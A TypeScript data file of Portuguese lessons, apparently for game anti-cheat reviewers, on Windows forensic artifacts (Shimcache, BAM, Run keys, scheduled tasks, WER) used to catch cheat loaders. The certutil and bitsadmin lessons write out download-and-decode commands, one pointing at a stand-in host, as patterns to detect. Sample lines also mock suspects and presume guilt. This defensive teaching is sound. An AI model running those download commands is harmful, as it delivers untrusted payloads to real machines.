import type { Lesson } from "./types";

const L = (
  order: number,
  id: string,
  title: string,
  categoryId: string,
  intro: string,
  sections: Lesson["sections"],
  checklist: string[]
): Lesson => ({ order, id, title, categoryId, tier: "tier1", intro, sections, checklist });

export const tier1Extra: Lesson[] = [
  L(36, "shimcache", "Shimcache — Execuções Antigas", "windows",
    "O xiter apagou a Prefetch achando que virou fantasma. Shimcache é o espírito vingativo que guarda cada .exe que passou pelo PC — inclusive o loader que ele jurou ter deletado.",
    [
      {
        kind: "intro",
        heading: "O que é Shimcache (AppCompatCache)?",
        body: "Shimcache é um registro interno do Windows que anota executáveis que rodaram no sistema — path, timestamp, tamanho.\n\nA diferença brutal: ele NÃO depende da pasta Prefetch. Xiter pode dar del /f /q na C:\\Windows\\Prefetch e ainda aparecer aqui.\n\nFerramenta clássica: AppCompatCacheParser (Eric Zimmerman). Exporta CSV legível pro relatório.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Onde Morre a Mentira",
        body: "Shimcache vive no registry:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\n\nNa prática tu não abre isso no bloco de notas. Usa parser ou área do 171 ScreenS se tiver.\n\nFluxo na SS:\n1. Exporta Shimcache do período da denúncia\n2. Ordena por Last Modified / Execution Time\n3. Procura .exe de Temp, Downloads, AppData com horário perto do jogo",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Prefetch Morto, Shimcache Vivo",
        body: "Cenário clássico: pasta Prefetch limpa demais (5 arquivos num PC usado todo dia) mas Shimcache lista LOADER_V3.EXE de C:\\Users\\X\\AppData\\Local\\Temp\\ às 14:29.\n\nIsso é anti-forense falho. O cara limpou o óbvio e esqueceu o registro do sistema.\n\nCruza: Shimcache + BAM + Journal = timeline indestrutível.",
        example: "Mano, Prefetch zerada mas Shimcache mostra loader_v3.exe às 14:29? Você limpou a sala e esqueceu a câmera de segurança ligada. Explica essa execução ou fecha a boca.",
      },
      {
        kind: "tecnica",
        heading: "🕒 Timeline de Execução",
        body: "Shimcache mostra QUANDO o .exe rodou, não só que existiu.\n\nMonta linha do tempo:\n• 14:28 — CMD.EXE (Shimcache)\n• 14:29 — LOADER.EXE (Shimcache)\n• 14:30 — HD-Player.exe / emulador\n• 14:31 — Scan iniciado\n\nSequência loader → emulador → scan = script clássico de inject antes da telagem.",
        example: "Que coincidência, hein? CMD abriu 14:28, loader 14:29, emulador 14:30. Você tava montando um quebra-cabeça ou preparando a SS?",
      },
      {
        kind: "zuera",
        heading: "🤣 O Xiter que Descobriu Shimcache no Google",
        body: "Tem maluco que lê sobre Shimcache, entra em pânico e formata o PC.\n\nFormatação recente + conta nova + \"nunca usei nada\" = suspeito nível máximo.\n\nShimcache vazio num PC velho também cheira a limpeza profissional. Telador esperto nota o VÁCUO, não só o lixo.",
        example: "Ah, formatou ontem? Que sorte a sua ter coincido com a denúncia. PC zerado é PC culpado — explica por que sumiu tudo.",
      },
      {
        kind: "veredito",
        heading: "Fechando com Shimcache",
        body: "Shimcache sozinho raramente é ban automático — mas com Prefetch, BAM ou Journal batendo horário vira prova sólida.\n\nDocumenta: path completo, timestamp, cruzamento com outros artefatos.\n\nPrint do parser + entrada destacada. Veredito na call com timeline na mão.",
      },
    ],
    [
      "Exportar Shimcache (AppCompatCacheParser ou 171 ScreenS)",
      "Ordenar por data — foco no período da denúncia",
      "Procurar .exe de Temp/Downloads/AppData",
      "Cruzar com BAM e Prefetch",
      "Montar timeline loader → emulador → scan",
      "Print datado + evidência numerada",
    ]),

  L(37, "bam-detalhado", "BAM — Background Activity Moderator", "windows",
    "BAM é o diário íntimo do Windows: cada .exe que rodou, carimbado com horário UTC. Prefetch sumiu? BAM ainda lembra. Xiter burro perde.",
    [
      {
        kind: "intro",
        heading: "O que é BAM?",
        body: "Background Activity Moderator registra executáveis executados por usuário — path completo e timestamp da última execução.\n\nVive no registry por SID de usuário. Backup forense quando Prefetch foi deletada ou nunca gerou .pf.\n\nWindows 10/11 — artefato subestimado por telador preguiçoso.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Caminho no Registry",
        body: "Path base:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\{SID}\n\nCada SID = um usuário. Valores = path do .exe + timestamp binário.\n\nNa SS:\n1. Acha o SID do user (whoami /user ou painel scan)\n2. Exporta chave BAM desse SID\n3. Usa parser BAM ou BAMParser do Zimmerman\n4. Converte timestamp pra horário local",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Ler Entrada BAM",
        body: "Formato típico exportado:\n\n\\Device\\HarddiskVolume3\\Users\\X\\AppData\\Local\\Temp\\loader.exe\nLast Execution: 09/06/2026 14:31:02 UTC\n\nO path \\Device\\HarddiskVolumeX\\ mapeia pro drive C:, D:, etc.\n\nLoader em Temp/AppData com execução minutos antes do jogo = red flag absoluta.",
        example: "Irmão, BAM registrou loader.exe em AppData às 14:31 UTC. Prefetch sumiu mas o Windows não esquece. Qual parte do 'executou' tu não entende?",
      },
      {
        kind: "tecnica",
        heading: "🕒 Cruzamento BAM + Prefetch + Shimcache",
        body: "Triangulação:\n• Prefetch: LOADER.EXE-ABC123.pf às 14:31\n• Shimcache: mesmo path, mesmo horário\n• BAM: confirma execução pelo user da denúncia\n\nTrês artefatos independentes apontando pro mesmo .exe = caso fechado.\n\nUm só pode ser 'coincidência'. Três é condenação.",
        example: "Prefetch, Shimcache E BAM no mesmo loader às 14:31? Três testemunhas, mano. Tu não tava 'só abrindo Discord'.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Nunca Executei Esse Arquivo'",
        body: "Xiter clássico: vê entrada BAM, entra em negação total.\n\nResposta na call: BAM não mente. Windows registrou execução pelo SEU usuário, no SEU SID, no SEU horário.\n\nNão foi vírus. Não foi primo. Não foi Windows Update. Foi tu.",
        example: "Ah, apareceu sozinho? BAM registra execução real, não fantasma. Primo não loga na tua conta às 14:31. Próximo.",
      },
      {
        kind: "veredito",
        heading: "Documentando BAM",
        body: "No relatório:\n• SID do usuário\n• Path completo do executável\n• Timestamp UTC + conversão local\n• Cruzamento com Prefetch/Shimcache\n\nPrint do parser. Evidência numerada. Veredito claro.",
      },
    ],
    [
      "Identificar SID do usuário denunciado",
      "Exportar HKLM\\...\\bam\\State\\UserSettings\\{SID}",
      "Parsear entradas — path + timestamp",
      "Procurar .exe em Temp/AppData/Downloads",
      "Cruzar com Prefetch e Shimcache",
      "Print + timeline no relatório",
    ]),

  L(38, "startup-programs", "Programas de Inicialização", "windows",
    "Cheat que sobrevive ao reboot esconde no boot. Task Manager mostra metade — registry Run e pasta Startup guardam o resto. Telador burro só olha uma.",
    [
      {
        kind: "intro",
        heading: "Por que Inicialização Importa?",
        body: "Persistência = cheat roda toda vez que o PC liga, sem o xiter abrir nada manualmente.\n\nLocais clássicos:\n• Task Manager → Inicializar\n• HKCU/HKLM Run e RunOnce\n• shell:startup (pasta Startup do user)\n• Task Scheduler no logon (aula separada)\n\nLoader invisível no dia a dia mas sempre ativo = pesadelo do cheater preguiçoso.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Task Manager",
        body: "Na SS manda abrir:\n\nCtrl + Shift + Esc → aba Inicializar (Startup)\n\nOrdena por Status (Habilitado). Procura:\n• Nomes genéricos: WindowsHelper, SecurityUpdate, OneDriveSync\n• Publisher vazio ou desconhecido\n• Caminho apontando Temp, AppData, Downloads\n\nClica direito → Abrir local do arquivo → vê o .exe real.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 2 — Pasta Startup",
        body: "Win + R → shell:startup → Enter\n\nMostra atalhos e .exe que rodam no logon desse user.\n\nTambém checa:\nWin + R → shell:common startup\n\n(pasta Startup de todos os usuários — menos comum mas existe)",
        example: "Ué, WindowsHelper.exe na Inicializar apontando pra C:\\Users\\X\\AppData\\svc.exe? Desde quando helper do Windows mora no AppData com 400KB?",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Registry Run Keys",
        body: "Win + R → regedit → navega:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\...\\RunOnce\nHKLM\\...\\Run (precisa admin)\n\nValores suspeitos: nome bonito, path feio.\n\nSecurityUpdate → C:\\Temp\\update.exe = ban na hora.",
        example: "Valor 'SecurityUpdate' apontando loader em Temp? Windows Update não mora em Temp com nome de loader. Explica ou cala.",
      },
      {
        kind: "zuera",
        heading: "🤣 'É Programa de Otimização'",
        body: "Xiter adora botar nome de:\n• Game Booster Pro\n• FPS Unlocker\n• Windows Tweaker\n\nSe aponta pra .exe sem assinatura em AppData — não é otimização. É persistência de cheat.\n\nPergunta: qual site baixou? Por que inicia com Windows? Por que DIE marca como packed?",
        example: "Game Booster que mora em Temp e inicia sozinho? Booster de quê — de ban? Mostra o site que baixou essa porcaria.",
      },
      {
        kind: "veredito",
        heading: "Fechando Startup",
        body: "Startup sozinho com .exe suspeito = investigação profunda (DIE, SHA, Prefetch).\n\nStartup + Prefetch + inject no emulador = caso.\n\nPrint de Task Manager, regedit e shell:startup. Caminho completo documentado.",
      },
    ],
    [
      "Ctrl+Shift+Esc → Inicializar → filtrar Habilitado",
      "Win+R shell:startup — listar .exe/.lnk",
      "Regedit Run e RunOnce (HKCU + HKLM se der)",
      "Abrir local do arquivo suspeito",
      "DIE + SHA no .exe encontrado",
      "Print datado de cada local",
    ]),

  L(39, "bluestacks-paths", "Emulador — Paths BlueStacks", "deteccoes",
    "BlueStacks é o emulador favorito do xiter BR. Se tu não sabe onde mora HD-Player.exe e os logs, tu tá telando no escuro — e o cheat tá rindo.",
    [
      {
        kind: "intro",
        heading: "Por que Conhecer os Paths?",
        body: "Inject no emulador = DLL ou thread estranha no processo do player.\n\nTelador precisa saber:\n• Processo principal (HD-Player.exe, BlueStacks.exe)\n• Onde ficam configs e logs\n• Pasta de instalação real vs atalho\n\nConfundir processo = perder inject na cara.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Instalação e Processos",
        body: "Paths comuns BlueStacks 5 (nxt):\n\nC:\\ProgramData\\BlueStacks_nxt\\\nC:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\n\nProcessos:\n• HD-Player.exe — emulador principal (ALVO DE INJECT)\n• BstkSVC.exe — serviço\n• BlueStacks X / BlueStacksAppplayer — versões antigas\n\nSystem Informer → filtra HD-Player → aba Modules (DLLs).",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Logs do Emulador",
        body: "Logs úteis:\n\nC:\\ProgramData\\BlueStacks_nxt\\Logs\\BstkSVC.log\nC:\\ProgramData\\BlueStacks_nxt\\Logs\\Player.log\n\nProcura: erro de módulo, crash, DLL não assinada, timestamp perto da partida.\n\nCrash + faulting module = caminho pro inject.dll.",
        example: "BstkSVC.log mostra erro carregando módulo de C:\\Temp\\ às 14:30? Inject crashou e tu acha que ninguém viu. Print e SHA na hora.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ DLL List no System Informer",
        body: "Fluxo na SS:\n1. Abre System Informer como admin\n2. Processes → HD-Player.exe\n3. Aba Modules / DLLs\n4. Ordena por path — foco C:\\Temp, C:\\Users, Downloads\n5. DLL sem assinatura Microsoft/BlueStacks = suspeita\n\nPrint da DLL + caminho + SHA256.",
        example: "unknown.dll em C:\\Temp\\ carregada no HD-Player? Emulador não carrega DLL random de Temp. Explica ou assume.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Uso BlueStacks Oficial do Site'",
        body: "Site oficial não instala inject.dll em Temp.\n\nXiter usa BlueStacks real + loader externo. O emulador é limpo — o processo HD-Player é que tá infectado na sessão.\n\nNão confunde: emulador legítimo ≠ sessão limpa.",
        example: "BlueStacks oficial não vem com aim.dll no Temp. Tu instalou o emulador ou o pacote completo com 'bônus'?",
      },
      {
        kind: "veredito",
        heading: "Checklist BlueStacks",
        body: "Confirma emulador → processo certo → Modules limpas ou suspeitas → logs → cruzamento Event 10/1000.\n\nEvidência: print SI + log + SHA. Veredito com artefato Windows (Prefetch loader) se tiver.",
      },
    ],
    [
      "Confirmar BlueStacks (HD-Player.exe rodando)",
      "System Informer → HD-Player → Modules",
      "Checar DLLs de Temp/AppData sem assinatura",
      "Ler BstkSVC.log / Player.log do período",
      "Print + SHA256 de DLL suspeita",
      "Cruzar com Event Viewer / Prefetch loader",
    ]),

  L(40, "ldplayer-paths", "Emulador — LDPlayer / MEmu", "deteccoes",
    "LDPlayer, MEmu, Nox — cada um com processo diferente. Confundir dnplayer com MEmuHeadless = telador amador perdendo inject na frente do xiter.",
    [
      {
        kind: "intro",
        heading: "Emuladores ≠ Um Processo Só",
        body: "Erro clássico: procurar HD-Player num PC com LDPlayer.\n\nCada emulador tem:\n• Executável principal (alvo inject)\n• Serviços background\n• Pasta de instalação própria\n\nIdentifica QUAL emu antes de abrir System Informer.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — LDPlayer",
        body: "Processos:\n• dnplayer.exe — player principal\n• LdVBoxHeadless.exe — motor virtual\n• Ld9BoxHeadless.exe — versões novas\n\nPaths:\nC:\\LDPlayer\\LDPlayer9\\\nC:\\Program Files\\LDPlayer\\\n\nSystem Informer → dnplayer.exe → Modules.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 2 — MEmu / Nox",
        body: "MEmu:\n• MEmuHeadless.exe, MemuSVC.exe\n• C:\\Program Files\\Microvirt\\MEmu\\\n\nNox:\n• Nox.exe, NoxVMHandle.exe\n• C:\\Program Files (x86)\\Nox\\\n\nMesma lógica: processo principal → DLLs → Temp/AppData.",
        example: "Procurando HD-Player num PC LDPlayer? Tu tá telando emulador errado, campeão. dnplayer.exe é o alvo aqui.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Identificar Emulador na SS",
        body: "Na call manda abrir Task Manager ou System Informer.\n\nPergunta direto: qual emulador usa?\n\nConfere processo rodando bate com resposta. Mentira na call + inject escondido = ban moral já começou.\n\nAnota versão e path de instalação.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Inject Target Correto",
        body: "Internal cheat no emu = DLL no processo do player (dnplayer, MEmuHeadless, Nox.exe).\n\nExternal = processo separado acessando memória do emu — Event 10 Process Access.\n\nDois cenários, duas caçadas. Não mistura.",
        example: "Event 10 mostrando loader.exe acessando dnplayer? External clássico. 'Só uso macro' não cola com Process Access na cara.",
      },
      {
        kind: "veredito",
        heading: "Fechando Paths de Emulador",
        body: "Emulador identificado → processo certo → Modules → logs se existirem → Event 10/8.\n\nPrint com nome do processo visível. Relatório deixa claro QUAL emu foi analisado.",
      },
    ],
    [
      "Perguntar e confirmar qual emulador (LD/MEmu/Nox/BS)",
      "Achar processo principal no Task Manager / SI",
      "System Informer → Modules no processo certo",
      "Procurar DLL/access de Temp/AppData",
      "Checar Event 10 se external",
      "Print processo + path instalação",
    ]),

  L(41, "certutil-abuse", "Certutil — Download & Decode", "deteccoes",
    "Certutil é ferramenta do Windows. Xiter usa pra baixar e decodificar cheat sem abrir browser — deixa rastro em Prefetch, Journal e CMD history.",
    [
      {
        kind: "intro",
        heading: "O que é Certutil Abuse?",
        body: "certutil.exe — binário LEGÍTIMO do Windows para certificados.\n\nAbuso clássico:\n• certutil -urlcache -split -f URL arquivo.exe — download\n• certutil -decode input.b64 output.exe — decode Base64\n\nLiving off the land: não precisa baixar dropper separado. CMD + certutil = entrega do cheat.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Comandos que Denunciam",
        body: "Padrões na Prefetch / logs:\n\ncertutil -urlcache -split -f http://...\ncertutil -decode payload.b64 cheat.exe\n\nPrefetch: CERTUTIL.EXE + CMD.EXE no mesmo minuto.\n\nJournal: CREATE em Temp/Downloads do arquivo baixado.\n\n171 ScreenS ou MFTECmd mostra a cadeia.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Timeline Certutil",
        body: "Monta:\n• 14:25 CMD.EXE (Prefetch)\n• 14:25 CERTUTIL.EXE (Prefetch)\n• 14:26 CREATE C:\\Temp\\stage.exe (Journal)\n• 14:28 LOADER executado\n• 14:30 Jogo\n\nDownload via certutil → execução → jogo = dropper scriptado.",
        example: "Certutil baixou stage.exe às 14:26 e loader rodou 14:28? Não foi Windows Update, mano. Foi delivery de cheat via CMD.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Arquivo Gerado",
        body: "Acha o outfile do certutil:\n• Temp, Downloads, AppData\n• Nome genérico: update.exe, svc.bin decoded\n\nPassa DIE + SHA256. Mesmo deletado — Prefetch/Journal/Shimcache guardam o rastro.\n\nPowerShell também usa certutil inline — olha PS prefetch também.",
        example: "stage.exe decode de certutil com entropia 7.8 no DIE? Packed loader. 'Arquivo do meu trabalho' — qual trabalho, hacker?",
      },
      {
        kind: "zuera",
        heading: "🤣 'Nunca Usei CMD'",
        body: "Prefetch CERTUTIL.EXE + CMD.EXE no horário da denúncia.\n\nCertutil não abre sozinho. Alguém digitou comando.\n\nNegação + artefato = call curta.",
        example: "Certutil executou sozinho? Ghost in the shell? CMD abriu na mesma hora — foi poltergeist digitando?",
      },
      {
        kind: "veredito",
        heading: "Documentando Certutil",
        body: "Evidências:\n• Prefetch CERTUTIL + CMD\n• Journal CREATE do arquivo\n• DIE/SHA do outfile\n• Timeline completa\n\nLiving off the land é técnica conhecida — staff sabe. Relatório numerado.",
      },
    ],
    [
      "Prefetch: CERTUTIL.EXE + CMD.EXE no período",
      "Journal: CREATE após certutil",
      "Localizar arquivo baixado/decodado",
      "DIE + SHA256 no outfile",
      "Montar timeline download → exec → jogo",
      "Print Prefetch + Journal + DIE",
    ]),

  L(42, "bitsadmin-abuse", "Bitsadmin — Download Silencioso", "deteccoes",
    "Bitsadmin baixa arquivo em background sem browser — xiter acha que é stealth. Prefetch e BITS logs entregam ele igual certutil, só muda o comando.",
    [
      {
        kind: "intro",
        heading: "O que é BITS Abuse?",
        body: "Background Intelligent Transfer Service — transferências em background (Windows Update usa).\n\nAbuso:\nbitsadmin /transfer NomeJob /download /priority normal URL C:\\path\\file.exe\n\nMenos barulhento que browser — mas deixa Prefetch bitsadmin.exe ou cmd/powershell chamando bitsadmin.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Sinais no Sistema",
        body: "Onde olhar:\n• Prefetch BITSADMIN.EXE ou POWERSHELL.EXE\n• Event logs BITS (se disponível)\n• Arquivo destino em Temp/AppData\n• Journal CREATE no path do job\n\nComando via PS:\nStart-BitsTransfer -Source URL -Destination path",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Job de Transferência",
        body: "bitsadmin /transfer UpdateCheck http://malicio.site/payload.exe C:\\Temp\\svc.exe\n\nJob name fake (UpdateCheck, OneDriveSync) + path Temp = padrão.\n\nCruza horário transfer com execução do outfile + abertura emulador.",
        example: "Bitsadmin transferiu svc.exe pra Temp às 14:20? 'UpdateCheck' não é nome de job do Windows real. Explica o download.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Destino e Hash",
        body: "Acha C:\\path\\file.exe do comando — mesmo deletado:\n• Journal USN\n• Prefetch do outfile\n• Shimcache/BAM\n\nSHA256 do arquivo (backup ou quarentena Defender) fecha identificação.",
        example: "Arquivo destino sumiu mas Prefetch SVC.EXE às 14:21? Deletou prova, não histórico. BAM lembra.",
      },
      {
        kind: "zuera",
        heading: "🤣 Download 'Silencioso'",
        body: "Silencioso pro usuário burro. Pro telador com Prefetch + Journal é megafone.\n\nBITS, certutil, curl, PS Invoke-WebRequest — mesma cadeia, ferramenta diferente.",
        example: "Achou que bitsadmin era invisível? Prefetch grita BITSADMIN.EXE. Stealth de papelão.",
      },
      {
        kind: "veredito",
        heading: "Fechando BITS",
        body: "Prefetch bitsadmin/ps + journal + outfile SHA = evidência sólida de dropper.\n\nDocumenta comando inferido, path, horários. Cruza com loader no emulador se tiver.",
      },
    ],
    [
      "Prefetch BITSADMIN / PS no período",
      "Journal CREATE no path destino",
      "Localizar ou reconstruir arquivo baixado",
      "SHA256 + DIE no payload",
      "Timeline transfer → exec → jogo",
      "Print artefatos numerados",
    ]),

  L(43, "lnk-forense", "Análise de Atalhos (.lnk)", "windows",
    "Xiter deleta o .exe e acha que sumiu. O .lnk em Recent ainda aponta pro caminho real, argumentos e horário que abriu. Atalho não mente.",
    [
      {
        kind: "intro",
        heading: "O que .lnk Guarda?",
        body: "Atalho Windows (.lnk) = metadados forenses:\n• Target path (executável real)\n• Argumentos de linha de comando\n• Working directory\n• Timestamps (created, accessed, modified)\n• Ícone usado (pode ser disfarce)\n\nDeletou cheat.exe — Recent ainda tem cheat.lnk apontando C:\\Users\\X\\Downloads\\cheat_setup.exe",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Coletar .lnk",
        body: "Locais:\n\nWin + R → shell:recent\nC:\\Users\\X\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\\nDesktop e pastas do user\n\nNa SS: manda abrir shell:recent, ordena por data.\n\nClica direito .lnk suspeito → Propriedades → Destino (primeiro passo rápido).",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Parse com LECmd",
        body: "Ferramenta: LECmd (Eric Zimmerman) ou similar.\n\nExporta:\n• Target: C:\\Users\\X\\Downloads\\SuperBypass.exe\n• Arguments: --inject --silent\n• LastAccess: 09/06/2026 13:55\n\nArgs revelam loader (--key, --auth, path config).",
        example: ".lnk aponta SuperBypass.exe com --inject no Desktop, acessado 13:55? 'Atalho do Discord' com argumento inject. Sério?",
      },
      {
        kind: "tecnica",
        heading: "🛠️ .lnk + Prefetch + Journal",
        body: "Triangulação:\n• .lnk LastAccess 13:55\n• Prefetch SUPERBYPASS.EXE 13:55\n• Journal EXECUTE/READ mesmo path\n\nTarget deletado? .lnk + Prefetch + Shimcache ainda provam execução.",
        example: "Deletou o .exe mas .lnk e Prefetch às 13:55? Apagou arquivo, não histórico. Recent é teu inimigo.",
      },
      {
        kind: "zuera",
        heading: "🤣 Atalho 'Pro Discord'",
        body: "Xiter renomeia atalho pra Discord.lnk mas target é loader.exe.\n\nPropriedades / LECmd mostram target real. Disfarce de ícone não muda path interno.",
        example: "Ícone Discord, target loader.exe em Downloads? Tu acha que telador não clica Propriedades? Comédia pura.",
      },
      {
        kind: "veredito",
        heading: "Documentando .lnk",
        body: "Print Propriedades + export LECmd se possível.\n\nEvidência: target path, args, timestamp. Cruza com scan/Prefetch.\n\n.lnk sozinho = forte indicador de execução de path específico.",
      },
    ],
    [
      "Win+R shell:recent — ordenar por data",
      "Propriedades de .lnk suspeitos (target + args)",
      "Parse LECmd se disponível",
      "Cruzar LastAccess com Prefetch/Journal",
      "Anotar path mesmo se .exe deletado",
      "Print datado + evidência numerada",
    ]),

  L(44, "wer-basico", "WER — Relatórios de Erro", "windows",
    "Inject mal feito crasha o emulador. WER guarda o relatório — faulting module, offset, horário. Xiter crashou e nem sabe que confessou.",
    [
      {
        kind: "intro",
        heading: "O que é WER?",
        body: "Windows Error Reporting — quando app crasha, Windows gera relatório em:\n\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\\n\nContém: app que crashou, módulo culpado (DLL), exception code, timestamp.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Navegar WER",
        body: "Win + R → cola:\n\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\n\nOrdena pastas por Data de Modificação.\n\nCada ReportXXXX contém Report.wer (texto legível) e arquivos auxiliares.\n\nAbre Report.wer no Notepad — procura Fault bucket, Faulting module path.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Crash de Inject",
        body: "Padrão clássico:\n\nAppName: HD-Player.exe (ou dnplayer.exe)\nFaulting module: inject.dll / unknown.dll\nPath: C:\\Temp\\inject.dll\n\nInject instável crasha emu — WER registra a DLL culpada com path completo.",
        example: "WER: HD-Player crashou — faulting module C:\\Temp\\inject.dll às 14:32? Inject crashou e Windows guardou prova. 'Nunca usei DLL' — WER discorda.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Cruzar Event 1000",
        body: "Event Viewer → Windows Logs → Application\n\nEvent ID 1000 — Application Error\n\nMesmo crash: app, fault module, exception.\n\nWER + Event 1000 + SI Modules = três fontes pro mesmo inject.",
        example: "Event 1000 e WER no mesmo inject.dll às 14:32? Crash confessou. Argumento 'emulador bugado' morre aqui.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Meu Emulador Crasha Sempre'",
        body: "Crash genérico ≠ faulting module inject.dll em Temp.\n\nBlueStacks estável + WER apontando DLL random = sessão contaminada.\n\nPede WER do período da partida denunciada — não crash de mês passado.",
        example: "Crash sempre com inject.dll em Temp? Que coincidência do caralho. Emulador não vem com inject de fábrica.",
      },
      {
        kind: "veredito",
        heading: "Documentando WER",
        body: "Print Report.wer destacando AppName + Faulting module + path + time.\n\nCruza Event 1000. SHA da DLL se ainda existir.\n\nCrash forense = evidência técnica forte de inject tentado ou ativo.",
      },
    ],
    [
      "Abrir C:\\ProgramData\\...\\WER\\ReportArchive",
      "Ordenar reports por data — foco partida denunciada",
      "Ler Report.wer — AppName + Faulting module",
      "Cruzar Event Viewer ID 1000",
      "Print report + event log",
      "SHA DLL faulting se arquivo existir",
    ]),

  L(45, "task-scheduler", "Agendador de Tarefas", "deteccoes",
    "Startup visível é amador. Task Scheduler roda cheat no logon com nome fake — OneDriveSync que aponta Temp. Telador que não abre taskschd.msc perde metade dos persistentes.",
    [
      {
        kind: "intro",
        heading: "Persistência via Tarefa Agendada",
        body: "Task Scheduler = cheat roda automaticamente:\n• No logon do user\n• A cada X minutos\n• Com privilégio elevado (se configurado)\n\nNome da tarefa imita serviço legítimo. Ação aponta .exe em Temp/AppData.\n\nMais stealth que Startup — mas XML e histórico entregam.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Abrir e Filtrar",
        body: "Win + R → taskschd.msc → Enter\n\nTask Scheduler Library → filtra por Author (usuário denunciado).\n\nOlha:\n• Nome suspeito (WindowsUpdate, GoogleSync, GameOpt)\n• Trigger: At logon, repetido\n• Action: Start program → path do .exe\n\nClica tarefa → aba Actions e Triggers.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Tarefa Fake",
        body: "Exemplo real:\n\nNome: OneDriveSync\nTrigger: At logon\nAction: C:\\Users\\X\\AppData\\Local\\Temp\\sync.exe\n\nOneDrive real não aponta Temp. Nome copiado + path lixo = persistência de loader.",
        example: "Tarefa OneDriveSync rodando sync.exe de Temp no logon? OneDrive da Microsoft não mora em Temp com nome sync.exe. Ban na moral.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ XML e Histórico",
        body: "Clica direito tarefa → Export — XML mostra Command, Arguments, RunLevel (Highest se elevado).\n\nAba History (se habilitada) — últimas execuções.\n\nCruza Last Run Time com Prefetch do .exe na ação.",
        example: "Task rodou 14:25, Prefetch sync.exe 14:25, loader no emu 14:26? Persistência + inject — combo completo.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Windows Criou Sozinho'",
        body: "Tarefas Microsoft têm Author Microsoft Corporation e path System32.\n\nTarefa Author = nome do user + .exe AppData = user criou (ou script criou).\n\nNegação padrão não cola.",
        example: "Windows criou tarefa apontando teu loader em AppData? Microsoft tá de brincadeira contigo?",
      },
      {
        kind: "veredito",
        heading: "Documentando Task Scheduler",
        body: "Print: nome tarefa, trigger, action path, author.\n\nDIE + SHA no .exe da ação. Export XML se possível.\n\nPersistência via Task = agravante — cheat sobrevive reboot.",
      },
    ],
    [
      "Win+R taskschd.msc — filtrar tarefas do user",
      "Revisar Actions → path .exe suspeito",
      "Checar Triggers (logon / repetido)",
      "Export XML ou print aba Actions",
      "DIE + SHA no executável da ação",
      "Cruzar Last Run com Prefetch",
    ]),

  L(46, "reg-persistence", "Registry — Persistência Run/RunOnce", "deteccoes",
    "Run keys são o clássico dos clássicos — cheat no boot via regedit. Xiter apaga Startup visível e esquece HKCU Run. Telador burro cai. Tu não.",
    [
      {
        kind: "intro",
        heading: "Run / RunOnce — Persistência Registry",
        body: "Chaves que executam programas no logon:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\...\\RunOnce\nHKLM\\...\\Run (machine-wide)\n\nValor = nome bonito, Data = path do .exe.\n\nRunOnce executa uma vez e some — Run persiste todo boot.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Regedit na SS",
        body: "Win + R → regedit → Enter\n\nNavega HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nLista TODOS os valores. Procura Data apontando:\n• Temp, AppData, Downloads\n• .exe sem path System32/Program Files conhecido\n\nRepete RunOnce e HKLM Run se tiver admin.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Valor Suspeito",
        body: "Padrão:\n\nNome: SecurityUpdate\nData: \"C:\\Users\\X\\AppData\\Roaming\\loader.exe\"\n\nNome imita Windows. Path não.\n\nClica no path → copia → verifica se arquivo existe → DIE se existir.",
        example: "SecurityUpdate em Run apontando loader.exe AppData? Windows Update não se registra em Run com nome de loader. Próximo argumento.",
      },
      {
        kind: "tecnica",
        heading: "🛠️ Run + Startup + Task — Combo",
        body: "Cheater paranóico usa UM método. Cheater burro usa vários — ou deixa Run enquanto limpa Startup.\n\nVarre os três:\n• Task Manager Startup\n• regedit Run/RunOnce\n• taskschd.msc\n\nAchar qualquer um com .exe suspeito = linha de investigação.",
        example: "Startup limpo mas Run key com loader? Achou que esconder no regedit era ninja move. Telador lê registry.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Meu Antivírus Colocou'",
